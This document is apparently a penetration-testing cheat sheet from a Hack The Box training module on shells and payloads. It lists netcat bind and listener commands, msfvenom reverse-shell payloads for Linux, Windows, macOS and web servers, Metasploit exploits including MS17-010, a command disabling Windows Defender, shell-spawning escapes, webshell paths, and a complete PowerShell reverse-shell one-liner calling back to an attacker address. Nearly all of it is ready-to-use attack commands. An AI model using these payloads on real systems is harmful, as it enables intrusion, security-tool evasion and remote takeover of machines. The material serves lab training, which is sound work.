
---

| **Command**                                                                                         | **Description**                                                                                                                                                                                         |
| --------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!`                                       | Connect to a Windows target using Remote Desktop Protocol.                                                                                                                                              |
| `env`                                                                                               | Discover system environmental variables to identify the shell language in use.                                                                                                                          |
| `sudo nc -lvnp <port #>`                                                                            | Start a netcat listener on a specified port.                                                                                                                                                            |
| `nc -nv <IP> <port>`                                                                                | Connect to a netcat listener at the specified IP and port.                                                                                                                                              |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f` | Uses netcat to bind a shell (`/bin/bash`) the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on |
| `Set-MpPreference -DisableRealtimeMonitoring $true`                                                 | Disable real-time monitoring in Windows Defender via PowerShell.                                                                                                                                        |
| `use exploit/windows/smb/psexec`                                                                    | Metasploit module to establish a shell session on a Windows system via SMB.                                                                                                                             |
| `shell`                                                                                             | Drop into a system shell from a meterpreter session.                                                                                                                                                    |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f elf > payload.elf`              | Generate a Linux reverse shell payload.                                                                                                                                                                 |
| `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f exe > payload.exe`                | Generate a Windows reverse shell payload.                                                                                                                                                               |
| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f macho > payload.macho`            | Generate a macOS reverse shell payload.                                                                                                                                                                 |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f asp > payload.asp`          | Generate an ASP web reverse shell payload.                                                                                                                                                              |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<port> -f raw > payload.jsp`               | Generate a JSP web reverse shell payload.                                                                                                                                                               |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<port> -f war > payload.war`               | Generate a WAR reverse shell payload.                                                                                                                                                                   |
| `use auxiliary/scanner/smb/smb_ms17_010`                                                            | Check if a host is vulnerable to MS17-010 using Metasploit.                                                                                                                                             |
| `use exploit/windows/smb/ms17_010_psexec`                                                           | Exploit MS17-010 to gain a reverse shell on a vulnerable Windows system.                                                                                                                                |
| `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce`                                       | Exploit rConfig 3.9.6 for a reverse shell on a vulnerable Linux system.                                                                                                                                 |
| `python -c 'import pty; pty.spawn("/bin/sh")'`                                                      | Spawn an interactive shell using Python.                                                                                                                                                                |
| `/bin/sh -i`                                                                                        | Spawn an interactive shell on a Linux-based system.                                                                                                                                                     |
| `perl -e 'exec "/bin/sh";'`                                                                         | Spawn an interactive shell using Perl.                                                                                                                                                                  |
| `ruby -e 'exec "/bin/sh"'`                                                                          | Spawn an interactive shell using Ruby.                                                                                                                                                                  |
| `lua -e 'os.execute("/bin/sh")'`                                                                    | Spawn an interactive shell using Lua.                                                                                                                                                                   |
| `awk 'BEGIN {system("/bin/sh")}'`                                                                   | Spawn an interactive shell using awk.                                                                                                                                                                   |
| `find / -name <filename> -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`                             | Use `find` and `awk` to spawn an interactive shell.                                                                                                                                                     |
| `find . -exec /bin/sh \; -quit`                                                                     | Alternative `find` command to spawn an interactive shell.                                                                                                                                               |
| `vim -c ':!/bin/sh'`                                                                                | Spawn a shell using the `vim` text editor.                                                                                                                                                              |
| `ls -la <path/to/fileorbinary>`                                                                     | List files and directories with permissions. Use to identify executable binaries.                                                                                                                       |
| `sudo -l`                                                                                           | List commands the current user can run as sudo.                                                                                                                                                         |
| `/usr/share/webshells/laudanum`                                                                     | Path to Laudanum webshells on ParrotOS and Pwnbox.                                                                                                                                                      |
| `/usr/share/nishang/Antak-WebShell`                                                                 | Path to Antak WebShell on ParrotOS and Pwnbox.                                                                                                                                                          |

---

**`Powershell` one-liner used to connect back to a listener that has been started on an attack box**:

`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`